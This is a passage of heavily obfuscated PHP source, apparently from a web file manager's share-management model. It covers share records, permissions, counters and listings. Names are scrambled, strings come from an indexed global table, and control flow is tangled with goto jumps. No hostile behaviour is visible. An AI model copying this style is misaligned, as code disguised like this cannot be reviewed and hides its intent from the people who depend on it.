$dßµƒ³Š…Â = REPEAT_RENAME, $AÒ¼¸æ¥ƒ¥ = false) { $AìµºÎÊí§ =& $_SERVER[¹Ò‹Ò¹]; $c¿Š“µ¥Ï¥ = $this->childList($dİµóò›‡¹); $a¢³±È›¬ = array_to_keyvalue($c¿Š“µ¥Ï¥, $AìµºÎÊí§[33], $AìµºÎÊí§[28]); return $this->fileNameAutoGet($a¢³±È›¬, $D×¹ÃŒí‘, $dßµƒ³Š…Â, $AÒ¼¸æ¥ƒ¥); } public function fileNameAutoGet($aİ¼Ã”òé‡, $BñÖÉÙÚ¡Ì, $aƒß£ÉÌŸµ, $D©•ô‡¯á) { $aÕ¼áÉŒ¯— =& $_SERVER[¹Ò‹Ò¹]; if ($aƒß£ÉÌŸµ == REPEAT_REPLACE || !$aİ¼Ã”òé‡ || !in_array_not_case($BñÖÉÙÚ¡Ì, $aİ¼Ã”òé‡) || $D©•ô‡¯á && $aƒß£ÉÌŸµ != REPEAT_RENAME_FOLDER) { return $BñÖÉÙÚ¡Ì; } if ($aƒß£ÉÌŸµ == REPEAT_SKIP) { return !1; } $a°°ˆâ½´ë = $aÕ¼áÉŒ¯—[94] . get_path_ext($BñÖÉÙÚ¡Ì); $a°°ˆâ½´ë = $a°°ˆâ½´ë == $aÕ¼áÉŒ¯—[94] || $D©•ô‡¯á ? $aÕ¼áÉŒ¯—[33] : $a°°ˆâ½´ë; for ($c¥á®ØÌ°õ = 1; $c¥á®ØÌ°õ <= count($aİ¼Ã”òé‡) + 1; $c¥á®ØÌ°õ++) { $cÁ´ÉÀ×Ì¢ = substr($BñÖÉÙÚ¡Ì, 0, strlen($BñÖÉÙÚ¡Ì) - strlen($a°°ˆâ½´ë)); $F›Ó¡³ÄÜù = $cÁ´ÉÀ×Ì¢ . "\x28{$c¥á®ØÌ°õ}\51{$a°°ˆâ½´ë}"; if (!in_array_not_case($F›Ó¡³ÄÜù, $aİ¼Ã”òé‡)) { return $F›Ó¡³ÄÜù; } } } } goto bÕÕ’œ†á³; BÖòİ†ªß“: class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\151\146\171\x54\151\x6d\145", "\x74\151\x6d\x65", "\151\156\x73\145\x72\x74\54\x75\160\x64\x61\x74\x65", "\x66\165\x6e\x63\164\151\157\156"), array("\x63\162\x65\141\x74\145\124\x69\x6d\x65", "\x74\x69\155\145", "\x69\156\163\145\162\164", "\146\x75\156\143\164\151\157\156"), array("\157\160\x74\x69\x6f\x6e\x73", '', "\151\x6e\163\x65\162\x74\54\165\160\x64\141\x74\x65\54\x73\x65\154\x65\x63\x74", "\152\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($aéµ©ÍÕíÊ) { $Cª³Ü°•» =& $_SERVER[¹Ò‹Ò¹]; $cÄô„¤—³Ø = isset($aéµ©ÍÕíÊ[0]) ? $aéµ©ÍÕíÊ[0] : !1; return array($Cª³Ü°•»[1797] => array(USER_ID, $Cª³Ü°•»[1798]), $Cª³Ü°•»[1741] => array($cÄô„¤—³Ø, $Cª³Ü°•»[1799])); } protected function listSimple() { $D£÷Ş¯Õ  = array($_SERVER[¹Ò‹Ò¹][1504] => USER_ID); $bÄËñƒ‹Ñ = $this->field($this->fieldList)->where($D£÷Ş¯Õ )->select(); return $bÄËñƒ‹Ñ ? $bÄËñƒ‹Ñ : array(); } protected function getInfo($Eñù‚Å¢Ü, $BÛášÚÄ…– = false) { $aÙÜ‹ÌõŒè =& $_SERVER[¹Ò‹Ò¹]; if ($BÛášÚÄ…–) { return $this->_getShareInfo(array($aÙÜ‹ÌõŒè[462] => $Eñù‚Å¢Ü)); } $c‹”‹²Ä°Â = $this->cacheFunctionGet($aÙÜ‹ÌõŒè[1748], $Eñù‚Å¢Ü); return $c‹”‹²Ä°Â; } public function getInfoByHash($AØßŠÎïÜë) { return $this->_getShareInfo(array($_SERVER[¹Ò‹Ò¹][464] => $AØßŠÎïÜë)); } public function getInfoByPath($C¿ªå„¼ÃŒ) { $dÆäÉŠ½Å‹ =& $_SERVER[¹Ò‹Ò¹]; $d”ö¨Éñ‹¢ = array($dÆäÉŠ½Å‹[1504] => USER_ID, $dÆäÉŠ½Å‹[390] => $C¿ªå„¼ÃŒ); return $this->_getShareInfo($d”ö¨Éñ‹¢); } public function getInfoBySourcePath($f¢ñÄ‹»”ù) { $CÂ·Ë³À°³ =& $_SERVER[¹Ò‹Ò¹]; $F¹¶Í÷¶ÅŠ = array($CÂ·Ë³À°³[1504] => USER_ID, $CÂ·Ë³À°³[1046] => $f¢ñÄ‹»”ù); return $this->_getShareInfo($F¹¶Í÷¶ÅŠ); } private function _getShareInfo($cÑù°Á¹) { goto f…„Ç“šğ; eÁâ·±³Ğ: if ($fÌàÑÃÖ·Ú[$D¦˜¤³Ü‘[390]] == $D¦˜¤³Ü‘[491]) { $fÌàÑÃÖ·Ú[$D¦˜¤³Ü‘[84]] = IO::info($fÌàÑÃÖ·Ú[$D¦˜¤³Ü‘[1046]]); } else { $fÌàÑÃÖ·Ú[$D¦˜¤³Ü‘[84]] = Model($D¦˜¤³Ü‘[1179])->pathInfo($fÌàÑÃÖ·Ú[$D¦˜¤³Ü‘[390]]); } $fÌàÑÃÖ·Ú[$D¦˜¤³Ü‘[1801]] = $C«ñî„´•Ö; return $fÌàÑÃÖ·Ú; goto e±¹½è¯Ëà; F‡ÊùÍÁù: $cÑù°Á¹ = array($D¦˜¤³Ü‘[462] => $fÌàÑÃÖ·Ú[$D¦˜¤³Ü‘[462]]); $bê¡¦½öŒç = $D¦˜¤³Ü‘[1800]; $C«ñî„´•Ö = Model($D¦˜¤³Ü‘[559])->order($D¦˜¤³Ü‘[388])->field($bê¡¦½öŒç)->where($cÑù°Á¹)->select(); goto eÁâ·±³Ğ; f…„Ç“šğ: $D¦˜¤³Ü‘ =& $_SERVER[¹Ò‹Ò¹]; $fÌàÑÃÖ·Ú = $this->where($cÑù°Á¹)->find(); if (!$fÌàÑÃÖ·Ú) { return !1; } goto F‡ÊùÍÁù; e±¹½è¯Ëà: } protected function getInfoAuth($DÄÒƒÁ—ŒÎ) { $f¨ĞÎã¾ÀŠ =& $_SERVER[¹Ò‹Ò¹]; $BšçùĞ¢à£ = $this->getInfo($DÄÒƒÁ—ŒÎ); $BšçùĞ¢à£[$f¨ĞÎã¾ÀŠ[400]] = Model($f¨ĞÎã¾ÀŠ[476])->authMake($BšçùĞ¢à£[$f¨ĞÎã¾ÀŠ[1801]]); return $BšçùĞ¢à£; } protected function listData($C‡÷ÜÖ¯‡Ö = null, $Bò¤®·Ì× = 300) { $bœ®­¸ËáÏ =& $_SERVER[¹Ò‹Ò¹]; $d£ïˆ¯äªª = array(array($bœ®­¸ËáÏ[467] => array($bœ®­¸ËáÏ[945], 0), $bœ®­¸ËáÏ[469] => array($bœ®­¸ËáÏ[945], 0), $bœ®­¸ËáÏ[1802] => $bœ®­¸ËáÏ[1756])); if ($C‡÷ÜÖ¯‡Ö == $bœ®­¸ËáÏ[1803]) { $d£ïˆ¯äªª = array($bœ®­¸ËáÏ[467] => 1); } else { if ($C‡÷ÜÖ¯‡Ö == $bœ®­¸ËáÏ[1031]) { $d£ïˆ¯äªª = array($bœ®­¸ËáÏ[469] => 1); } } $d£ïˆ¯äªª[$bœ®­¸ËáÏ[1504]] = USER_ID; $e¨êØ¾ = $this->where($d£ïˆ¯äªª)->selectPage($Bò¤®·Ì×); return $e¨êØ¾; } protected function listToMe($e‘ãôƒ¸»Ü = 300) { goto Fêä«šé»; F¦‚‘¶ø¤«: if ($dÍŒŒ˜õÙ) { $d“·”³âÖÑ = array(array($däšÀöµ«Ä[544] => SourceModel::TYPE_USER, $däšÀöµ«Ä[478] => USER_ID), array($däšÀöµ«Ä[544] => SourceModel::TYPE_GROUP, $däšÀöµ«Ä[478] => array($däšÀöµ«Ä[7], $dÍŒŒ˜õÙ)), $däšÀöµ«Ä[1802] => $däšÀöµ«Ä[1756]); } $Dêº™½ªïÍ = Model($däšÀöµ«Ä[559])->where($d“·”³âÖÑ)->selectPage($e‘ãôƒ¸»Ü); $EƒŒè÷…Ó” = array_to_keyvalue_group($Dêº™½ªïÍ[$däšÀöµ«Ä[365]], $däšÀöµ«Ä[462]); goto fÇ¨÷¬Úà; fÇ¨÷¬Úà: if (!$EƒŒè÷…Ó”) { return $Dêº™½ªïÍ; } $B’³‘Øˆ‚ = $däšÀöµ«Ä[1805]; $d“·”³âÖÑ = array($däšÀöµ«Ä[462] => array($däšÀöµ«Ä[405], array_keys($EƒŒè÷…Ó”))); goto D··Ó«·õ; Fêä«šé»: $däšÀöµ«Ä =& $_SERVER[¹Ò‹Ò¹]; $dÍŒŒ˜õÙ = Model($däšÀöµ«Ä[1804])->userGroupParents(USER_ID); $d“·”³âÖÑ = array($däšÀöµ«Ä[544] => SourceModel::TYPE_USER, $däšÀöµ«Ä[478] => USER_ID); goto F¦‚‘¶ø¤«; D··Ó«·õ: $BùòÏ˜‹ = $this->field($B’³‘Øˆ‚)->where($d“·”³âÖÑ)->select(); foreach ($BùòÏ˜‹ as $b‘…–³ÅÖé => &$f‘å‰íëÎ¦) { $f‘å‰íëÎ¦[$däšÀöµ«Ä[1801]] = $EƒŒè÷…Ó”[$f‘å‰íëÎ¦[$däšÀöµ«Ä[462]]]; } unset($f‘å‰íëÎ¦); goto béµôœÏï; béµôœÏï: $b×º³°µÇ = array($däšÀöµ«Ä[1806] => $BùòÏ˜‹, $däšÀöµ«Ä[1807] => $Dêº™½ªïÍ[$däšÀöµ«Ä[362]]); return $b×º³°µÇ; goto C›‹›¬Æô; C›‹›¬Æô: } protected function shareAdd($déËéà×ïÛ, $DÛËØÓè†Ø) { $bç‚ÙÜ„Š =& $_SERVER[¹Ò‹Ò¹]; $fŒ˜ƒ¯ë„è = $this->_addShareData($déËéà×ïÛ, $DÛËØÓè†Ø); if (!empty($DÛËØÓè†Ø[$bç‚ÙÜ„Š[1808]])) { $this->_shareAuthSet($fŒ˜ƒ¯ë„è, $DÛËØÓè†Ø[$bç‚ÙÜ„Š[1808]]); } $this->shareEventAdd($déËéà×ïÛ, $DÛËØÓè†Ø, $bç‚ÙÜ„Š[1034]); return $fŒ˜ƒ¯ë„è; } private function shareEventAdd($aÙÖÑïØµ‡, $e‘Ïè»¹ĞÎ, $DÊÏä‡ªéŸ = "\x61\x64\144") { goto c¢™”©šŒˆ; a¡¿çØ‰±Ç: if ($d‘“­¶âĞ[$ağ¿¹Û–Û[469]] == $ağ¿¹Û–Û[491] && $e‘Ïè»¹ĞÎ[$ağ¿¹Û–Û[469]] == $ağ¿¹Û–Û[86]) { $D–‡Ö«îãï = $ağ¿¹Û–Û[1810]; } if ($d‘“­¶âĞ[$ağ¿¹Û–Û[469]] == $ağ¿¹Û–Û[86] && $e‘Ïè»¹ĞÎ[$ağ¿¹Û–Û[469]] == $ağ¿¹Û–Û[491]) { $D–‡Ö«îãï = $ağ¿¹Û–Û[1813]; } Model($ağ¿¹Û–Û[528])->eventShare($aÙÖÑïØµ‡, $D–‡Ö«îãï); goto A…Ÿù°ÖëÙ; dÎÕ…´êöå: $D–‡Ö«îãï = $ağ¿¹Û–Û[1811]; if ($d‘“­¶âĞ[$ağ¿¹Û–Û[467]] == $ağ¿¹Û–Û[491] && $e‘Ïè»¹ĞÎ[$ağ¿¹Û–Û[467]] == $ağ¿¹Û–Û[86]) { $D–‡Ö«îãï = $ağ¿¹Û–Û[1809]; } if ($d‘“­¶âĞ[$ağ¿¹Û–Û[467]] == $ağ¿¹Û–Û[86] && $e‘Ïè»¹ĞÎ[$ağ¿¹Û–Û[467]] == $ağ¿¹Û–Û[491]) { $D–‡Ö«îãï = $ağ¿¹Û–Û[1812]; } goto a¡¿çØ‰±Ç; A…Ÿù°ÖëÙ: return; goto b‹¦ï„ìÃò; c¢™”©šŒˆ: $ağ¿¹Û–Û =& $_SERVER[¹Ò‹Ò¹]; if ($DÊÏä‡ªéŸ == $ağ¿¹Û–Û[1034]) { if ($e‘Ïè»¹ĞÎ[$ağ¿¹Û–Û[467]] == $ağ¿¹Û–Û[86]) { Model($ağ¿¹Û–Û[528])->eventShare($aÙÖÑïØµ‡, $ağ¿¹Û–Û[1809]); } if ($e‘Ïè»¹ĞÎ[$ağ¿¹Û–Û[469]] == $ağ¿¹Û–Û[86]) { Model($ağ¿¹Û–Û[528])->eventShare($aÙÖÑïØµ‡, $ağ¿¹Û–Û[1810]); } return; } $d‘“­¶âĞ = $this->getInfoByPath($aÙÖÑïØµ‡); goto dÎÕ…´êöå; b‹¦ï„ìÃò: } private function _addShareData($eõ§„à©æè, $BØÀ‘¨“Æ = array()) { goto e©ÙêÈÃÕÕ; AâÑª®‚‡ê: if ($eœŠÓØß’ = $this->where($EĞÕôˆø)->find()) { return $eœŠÓØß’[$bò±ßÀİÑ[462]]; } if ($eõ§„à©æè == 0) { $e“ó¡‡é°Ü = array($bò±ßÀİÑ[28] => get_path_this($BØÀ‘¨“Æ[$bò±ßÀİÑ[75]])); } else { $e“ó¡‡é°Ü = Model($bò±ßÀİÑ[769])->sourceInfo($eõ§„à©æè); if (!$e“ó¡‡é°Ü) { return !1; } } if (!$BØÀ‘¨“Æ[$bò±ßÀİÑ[1410]]) { $BØÀ‘¨“Æ[$bò±ßÀİÑ[1410]] = $e“ó¡‡é°Ü[$bò±ßÀİÑ[28]]; } goto eå¶Û‚ ù; eå¶Û‚ ù: $B¼»­±¢¹ = array($bò±ßÀİÑ[1496] => USER_ID, $bò±ßÀİÑ[404] => $eõ§„à©æè, $bò±ßÀİÑ[1410] => $bò±ßÀİÑ[33], $bò±ßÀİÑ[467] => 0, $bò±ßÀİÑ[469] => 0, $bò±ßÀİÑ[1046] => $bò±ßÀİÑ[33], $bò±ßÀİÑ[303] => $bò±ßÀİÑ[33], $bò±ßÀİÑ[825] => $bò±ßÀİÑ[33], $bò±ßÀİÑ[1815] => 0, $bò±ßÀİÑ[1816] => 0, $bò±ßÀİÑ[470] => 0, $bò±ßÀİÑ[471] => $bò±ßÀİÑ[33], $bò±ßÀİÑ[464] => $bò±ßÀİÑ[33]); $f©Õù¿‚Å = explode($bò±ßÀİÑ[47], $bò±ßÀİÑ[1817]); foreach ($f©Õù¿‚Å as $fÌë¢‚Ç) { if (!isset($BØÀ‘¨“Æ[$fÌë¢‚Ç])) { continue; } $B¼»­±¢¹[$fÌë¢‚Ç] = $BØÀ‘¨“Æ[$fÌë¢‚Ç]; } goto a–¨©Îì³˜; e©ÙêÈÃÕÕ: $bò±ßÀİÑ =& $_SERVER[¹Ò‹Ò¹]; $EĞÕôˆø = array($bò±ßÀİÑ[404] => $eõ§„à©æè, $bò±ßÀİÑ[1496] => USER_ID); if ($eõ§„à©æè == 0) { $EĞÕôˆø = array($bò±ßÀİÑ[1814] => $BØÀ‘¨“Æ[$bò±ßÀİÑ[1046]], $bò±ßÀİÑ[1496] => USER_ID); } goto AâÑª®‚‡ê; a–¨©Îì³˜: $Fâ“¥ãµğˆ = $this->add($B¼»­±¢¹); $FŞ‘Î•Ë¬ = array($bò±ßÀİÑ[464] => short_id($Fâ“¥ãµğˆ)); $this->where(array($bò±ßÀİÑ[461] => $Fâ“¥ãµğˆ))->save($FŞ‘Î•Ë¬); goto aÁĞ²š…ÀŞ; aÁĞ²š…ÀŞ: return $Fâ“¥ãµğˆ; goto A™í‹³è¥°; A™í‹³è¥°: } private function _shareAuthSet($AÆã©‰Ïš, $a¼‚¢Ó¨Ó„) { goto CÇÙ’Á‰Œ; DÎÜã•¨¬: return $F„§óéÛùÇ->addAll($Dš¥ƒÓ—Ê, array(), !0); goto d½¹‰¦ù; CÇÙ’Á‰Œ: $eó¦àß˜×Œ =& $_SERVER[¹Ò‹Ò¹]; if (!is_array($a¼‚¢Ó¨Ó„)) { return !1; } $F„§óéÛùÇ = Model($eó¦àß˜×Œ[1768]); goto A˜ßÎóçºË; A˜ßÎóçºË: $F„§óéÛùÇ->where(array($eó¦àß˜×Œ[462] => $AÆã©‰Ïš))->delete(); $Dš¥ƒÓ—Ê = array(); foreach ($a¼‚¢Ó¨Ó„ as $B³Œ£Ã–ˆœ) { $eÈ³óù‡‡ö = SourceModel::TYPE_USER; if ($B³Œ£Ã–ˆœ[$eó¦àß˜×Œ[398]] == SourceModel::TYPE_GROUP) { $eÈ³óù‡‡ö = SourceModel::TYPE_GROUP; } $Cè´Ø»ğ Æ = array($eó¦àß˜×Œ[462] => $AÆã©‰Ïš, $eó¦àß˜×Œ[398] => $eÈ³óù‡‡ö, $eó¦àß˜×Œ[478] => intval($B³Œ£Ã–ˆœ[$eó¦àß˜×Œ[478]]), $eó¦àß˜×Œ[1764] => 0, $eó¦àß˜×Œ[1818] => -1); if ($B³Œ£Ã–ˆœ[$eó¦àß˜×Œ[1764]]) { $Cè´Ø»ğ Æ[$eó¦àß˜×Œ[1764]] = $B³Œ£Ã–ˆœ[$eó¦àß˜×Œ[1764]]; } else { if ($B³Œ£Ã–ˆœ[$eó¦àß˜×Œ[1818]]) { $Cè´Ø»ğ Æ[$eó¦àß˜×Œ[1818]] = $B³Œ£Ã–ˆœ[$eó¦àß˜×Œ[1818]]; } } $Dš¥ƒÓ—Ê[] = $Cè´Ø»ğ Æ; } goto DÎÜã•¨¬; d½¹‰¦ù: } public function numViewAdd($Eùƒ‹±¢î‡) { $BÊ†¦à…Ò‹ =& $_SERVER[¹Ò‹Ò¹]; $eØŒŸ‰îªÜ = array($BÊ†¦à…Ò‹[461] => $Eùƒ‹±¢î‡); $this->where($eØŒŸ‰îªÜ)->setAdd($BÊ†¦à…Ò‹[1815]); } public function numDownloadAdd($C¤çÊ¤Îà) { $fÆçõÄê•— =& $_SERVER[¹Ò‹Ò¹]; $Bâ³ÁÔïÃî = array($fÆçõÄê•—[461] => $C¤çÊ¤Îà); $this->where($Bâ³ÁÔïÃî)->setAdd($fÆçõÄê•—[1816]); } protected function shareEdit($fš¥‰Ã·‘°, $CÛÕˆŠŒÁ) { goto eóÂªÙ÷Ûİ; eóÂªÙ÷Ûİ: $bŠáœ£ñà‘ =& $_SERVER[¹Ò‹Ò¹]; $fê´ŞÀáÜ = $this->getInfo($fš¥‰Ã·‘°); if (!$fê´ŞÀáÜ) { return !1; } goto EŒ’Ù®ê¾; fÕˆ¥Õ´‚: if (isset($CÛÕˆŠŒÁ[$bŠáœ£ñà‘[1808]])) { $this->_shareAuthSet($fš¥‰Ã·‘°, $CÛÕˆŠŒÁ[$bŠáœ£ñà‘[1808]]); } return !0; goto Aàò—›‡·›; A½”Óİ…ˆÖ: foreach ($f‘ÔÍ«Í¦Ñ as $fç¼”·Ê») { if (!array_key_exists($fç¼”·Ê», $CÛÕˆŠŒÁ)) { continue; } $aÁâ¯Ê¡[$fç¼”·Ê»] = $CÛÕˆŠŒÁ[$fç¼”·Ê»]; } $this->shareEventAdd($fê´ŞÀáÜ[$bŠáœ£ñà‘[390]], $CÛÕˆŠŒÁ, $bŠáœ£ñà‘[1634]); $this->where(array($bŠáœ£ñà‘[461] => $fš¥‰Ã·‘°))->save($aÁâ¯Ê¡); goto fÕˆ¥Õ´‚; EŒ’Ù®ê¾: $this->_checkLinkShare($CÛÕˆŠŒÁ, $fê´ŞÀáÜ); $aÁâ¯Ê¡ = array(); $f‘ÔÍ«Í¦Ñ = explode($bŠáœ£ñà‘[47], $bŠáœ£ñà‘[1819]); goto A½”Óİ…ˆÖ; Aàò—›‡·›: } private function _checkLinkShare($AÇô®Í‰Ã´, $d†¿‚†ÏŠ) { goto fÉ»îÀâ×Î; BÉí²Ò­¢À: if ($d†¿‚†ÏŠ[$EÒµª÷ëò˜[84]][$EÒµª÷ëò˜[29]] != $EÒµª÷ëò˜[191]) { $aµô—ÜÜ‰Ö = $this->_folderReport($BƒĞ•…İ´); if (!$aµô—ÜÜ‰Ö) { return; } show_json(LNG($EÒµª÷ëò˜[1820]) . $EÒµª÷ëò˜[1821] . $aµô—ÜÜ‰Ö, !1); } $fè›ê¶»‘å = Model($EÒµª÷ëò˜[769])->fileInfoGet($d†¿‚†ÏŠ[$EÒµª÷ëò˜[84]][$EÒµª÷ëò˜[390]]); if (!$fè›ê¶»‘å) { return; } goto EáÁŒÚÏã±; fÉ»îÀâ×Î: $EÒµª÷ëò˜ =& $_SERVER[¹Ò‹Ò¹]; if ($AÇô®Í‰Ã´[$EÒµª÷ëò˜[467]] != $EÒµª÷ëò˜[86]) { return; } $BƒĞ•…İ´ = $d†¿‚†ÏŠ[$EÒµª÷ëò˜[84]][$EÒµª÷ëò˜[390]]; goto BÉí²Ò­¢À; EáÁŒÚÏã±: $E¥œâ¶²Ç = $this->shareFileMeta($fè›ê¶»‘å[$EÒµª÷ëò˜[441]]); if (isset($E¥œâ¶²Ç[$EÒµª÷ëò˜[370]]) && $E¥œâ¶²Ç[$EÒµª÷ëò˜[370]] == $EÒµª÷ëò˜[86]) { show_json(LNG($EÒµª÷ëò˜[1822]), !1); } goto d„÷§ÄÒâ; d„÷§ÄÒâ: } private function _folderReport($eàöË¸ÂÅŸ) { goto eèÙŞ”‡ê–; c‰âÛ­‰ã¡: $EÈë±‰›Ï = substr($C¹ëùµïµÃ[$c–¿ÈÕù[481]], strpos($C¹ëùµïµÃ[$c–¿ÈÕù[481]], $D¢¼…‘®‘)); $EùÇ›ˆ´À” = array($c–¿ÈÕù[390] => array($c–¿ÈÕù[7], trim($EÈë±‰›Ï, $c–¿ÈÕù[47]))); $cÚ¡ø¼šƒÖ = Model($c–¿ÈÕù[769])->where($EùÇ›ˆ´À”)->field($c–¿ÈÕù[28])->select(); goto B’¶ˆ¤ƒ¹; Ašˆš…Æµã: if (!$FóøÙÒŸ§) { return !1; } $FóøÙÒŸ§ = array_to_keyvalue($FóøÙÒŸ§, $c–¿ÈÕù[33], $c–¿ÈÕù[441]); $D¢¼…‘®‘ = $c–¿ÈÕù[47] . $eàöË¸ÂÅŸ . $c–¿ÈÕù[47]; goto d÷Ëè‡ÓŒ; d÷Ëè‡ÓŒ: $EùÇ›ˆ´À” = array($c–¿ÈÕù[441] => array($c–¿ÈÕù[7], $FóøÙÒŸ§), $c–¿ÈÕù[481] => array($c–¿ÈÕù[378], "\x25{$D¢¼…‘®‘}\45"), $c–¿ÈÕù[417] => 0); $C¹ëùµïµÃ = Model($c–¿ÈÕù[769])->where($EùÇ›ˆ´À”)->field($c–¿ÈÕù[1824])->find(); if (!$C¹ëùµïµÃ) { return !1; } goto c‰âÛ­‰ã¡; eèÙŞ”‡ê–: $c–¿ÈÕù =& $_SERVER[¹Ò‹Ò¹]; $EùÇ›ˆ´À” = array($c–¿ÈÕù[441] => array($c–¿ÈÕù[945], 0), $c–¿ÈÕù[704] => 3); $FóøÙÒŸ§ = Model($c–¿ÈÕù[1823])->where($EùÇ›ˆ´À”)->field($c–¿ÈÕù[441])->select(); goto Ašˆš…Æµã; B’¶ˆ¤ƒ¹: $Cšéƒ¾¨¬ğ = array_to_keyvalue($cÚ¡ø¼šƒÖ, $c–¿ÈÕù[33], $c–¿ÈÕù[28]); $Cšéƒ¾¨¬ğ[] = $C¹ëùµïµÃ[$c–¿ÈÕù[28]]; return implode($c–¿ÈÕù[8], $Cšéƒ¾¨¬ğ); goto Dàá”¥¬¥ç; Dàá”¥¬¥ç: } protected function remove($Eº…™¬Ê£°) { goto CïóÀ÷¢; CïóÀ÷¢: $E³ĞÊ´ˆÖ =& $_SERVER[¹Ò‹Ò¹]; if (is_array($Eº…™¬Ê£°)) { $Eº…™¬Ê£° = array($E³ĞÊ´ˆÖ[7], $Eº…™¬Ê£°); } $D…ÙÁÀÏÅ = array($E³ĞÊ´ˆÖ[462] => $Eº…™¬Ê£°); goto F­âÜÂ®ÓÕ; bÀ±¼äÃ÷±: for ($EèÍÙÁ®² = 0; $EèÍÙÁ®² < count($eŠÎ¾âÁ); $EèÍÙÁ®²++) { $dª«¯ù¹‘ = $this->getInfo($eŠÎ¾âÁ[$EèÍÙÁ®²]); if ($dª«¯ù¹‘[$E³ĞÊ´ˆÖ[469]] == $E³ĞÊ´ˆÖ[86]) { Model($E³ĞÊ´ˆÖ[528])->eventShare($dª«¯ù¹‘[$E³ĞÊ´ˆÖ[390]], $E³ĞÊ´ˆÖ[1813]); } if ($dª«¯ù¹‘[$E³ĞÊ´ˆÖ[467]] == $E³ĞÊ´ˆÖ[86]) { Model($E³ĞÊ´ˆÖ[528])->eventShare($dª«¯ù¹‘[$E³ĞÊ´ˆÖ[390]], $E³ĞÊ´ˆÖ[1812]); } } return $CØ èÃİ¨; goto BÏóß¶İŒ; F­âÜÂ®ÓÕ: $CØ èÃİ¨ = $this->where($D…ÙÁÀÏÅ)->delete(); if ($CØ èÃİ¨) { Model($E³ĞÊ´ˆÖ[559])->where(array($E³ĞÊ´ˆÖ[462] => $Eº…™¬Ê£°))->delete(); } $eŠÎ¾âÁ = is_array($Eº…™¬Ê£°) ? $Eº…™¬Ê£°[1] : array($Eº…™¬Ê£°); goto bÀ±¼äÃ÷±; BÏóß¶İŒ: } protected function removeBySource($c³¥¹‘ï») { goto D‰­¿ï¾¶; D‰­¿ï¾¶: $F°¡øÖçÙ¿ =& $_SERVER[¹Ò‹Ò¹]; $b„äôØôŠ = array($F°¡øÖçÙ¿[404] => array($F°¡øÖçÙ¿[405], $c³¥¹‘ï»)); $aäíêÔØØä = $this->field($F°¡øÖçÙ¿[462])->where($b„äôØôŠ)->select(); goto bºáØ É; FÚ‡Œ×: $this->where($b„äôØôŠ)->delete(); Model($F°¡øÖçÙ¿[559])->where($b„äôØôŠ)->delete(); goto fß‚©¶šÙÓ; bºáØ É: $aäíêÔØØä = array_to_keyvalue($aäíêÔØØä, $F°¡øÖçÙ¿[33], $F°¡øÖçÙ¿[462]); if (!$aäíêÔØØä) { return; } $b„äôØôŠ = array($F°¡øÖçÙ¿[461] => array($F°¡øÖçÙ¿[405], $aäíêÔØØä)); goto FÚ‡Œ×; fß‚©¶šÙÓ: } public function listAll($B…Š½Ô£Š) { goto c‘•š¡²¤Ã; A˜¬±®ƒ: $E­¬«ï›èÙ = $this->_makeOrder()->where($Díòƒ±¹Ş)->selectPage(20); if (empty($E­¬«ï›èÙ[$c èÁ»îİ«[365]])) { return array(); } $this->_listDataApply($E­¬«ï›èÙ[$c èÁ»îİ«[365]]); goto bñÉˆ¶‚óÜ; c‘•š¡²¤Ã: $c èÁ»îİ« =& $_SERVER[¹Ò‹Ò¹]; $Díòƒ±¹Ş = array(); if ($B…Š½Ô£Š[$c èÁ»îİ«[1504]]) { $Díòƒ±¹Ş[$c èÁ»îİ«[1504]] = $B…Š½Ô£Š[$c èÁ»îİ«[1504]]; } goto Dˆ°«Ÿõ; Dˆ°«Ÿõ: if ($B…Š½Ô£Š[$c èÁ»îİ«[717]]) { $Eİ±¥Ñ¤Ö = $B…Š½Ô£Š[$c èÁ»îİ«[470]] ? $B…Š½Ô£Š[$c èÁ»îİ«[470]] : strtotime(date($c èÁ»îİ«[1825])); $Díòƒ±¹Ş[$c èÁ»îİ«[192]] = array($c èÁ»îİ«[329], array($B…Š½Ô£Š[$c èÁ»îİ«[717]], $Eİ±¥Ñ¤Ö)); } if ($B…Š½Ô£Š[$c èÁ»îİ«[29]]) { $Díòƒ±¹Ş[$B…Š½Ô£Š[$c èÁ»îİ«[29]]] = 1; } else { $Díòƒ±¹Ş[] = array($c èÁ»îİ«[467] => array($c èÁ»îİ«[945], 0), $c èÁ»îİ«[469] => array($c èÁ»îİ«[945], 0), $c èÁ»îİ«[1802] => $c èÁ»îİ«[1756]); } if ($B…Š½Ô£Š[$c èÁ»îİ«[1752]]) { $Díòƒ±¹Ş[] = array($c èÁ»îİ«[464] => $B…Š½Ô£Š[$c èÁ»îİ«[1752]], $c èÁ»îİ«[1410] => array($c èÁ»îİ«[378], "\x25{$B…Š½Ô£Š[$c èÁ»îİ«[1752]]}\45"), $c èÁ»îİ«[1802] => $c èÁ»îİ«[1756]); } goto A˜¬±®ƒ; bñÉˆ¶‚óÜ: return $E­¬«ï›èÙ; goto CÌ´ÇÍ‡˜; CÌ´ÇÍ‡˜: } public function listDataApply($bÃ¯ï¾ƒ‘‰) { $this->_listDataApply($bÃ¯ï¾ƒ‘‰); return $bÃ¯ï¾ƒ‘‰; } private function _listDataApply(&$cÈâ¥ÇìæÌ) { goto bïàÔ÷¬æ; bïàÔ÷¬æ: $dĞ«ÖŒ‰¿¿ =& $_SERVER[¹Ò‹Ò¹]; $AŸ•ğ¤Ó· = array_to_keyvalue($cÈâ¥ÇìæÌ, $dĞ«ÖŒ‰¿¿[33], $dĞ«ÖŒ‰¿¿[1504]); $BÏÍä¢Î = Model($dĞ«ÖŒ‰¿¿[501])->userListInfo(array_unique($AŸ•ğ¤Ó·)); goto EßŒäŠç×ø; EßŒäŠç×ø: $d¢„ãçæ¿• = array_to_keyvalue($cÈâ¥ÇìæÌ, $dĞ«ÖŒ‰¿¿[33], $dĞ«ÖŒ‰¿¿[390]); $eªÎÌ‡‡ « = Model($dĞ«ÖŒ‰¿¿[769])->sourceListInfo($d¢„ãçæ¿•, !0); foreach ($cÈâ¥ÇìæÌ as $EöÅŠİ‘¶å => &$c¸ïˆ…¥ŒÄ) { $dà‹¥À‹»Ö = $c¸ïˆ…¥ŒÄ[$dĞ«ÖŒ‰¿¿[1504]]; $c¸ïˆ…¥ŒÄ[$dĞ«ÖŒ‰¿¿[1826]] = $BÏÍä¢Î[$dà‹¥À‹»Ö] ? $BÏÍä¢Î[$dà‹¥À‹»Ö] : !1; $b‰ÒãÙ¦Ç = $c¸ïˆ…¥ŒÄ[$dĞ«ÖŒ‰¿¿[390]]; 